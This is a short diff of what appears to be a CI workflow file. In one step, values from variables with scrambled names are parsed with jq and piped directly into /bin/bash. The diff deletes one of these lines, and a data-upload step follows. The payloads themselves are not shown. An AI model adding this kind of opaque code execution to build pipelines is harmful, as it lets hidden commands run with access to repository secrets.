@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$nidaj583" | jq -r .ogr4 | /bin/bash
           echo $g273 | jq -r .id24 | /bin/bash
-          printf '%s' "$pmi9749" | jq -r .neti076 | /bin/bash
           echo $ik4043 | jq -r .gz23 | /bin/bash
 
       - name: Upload data
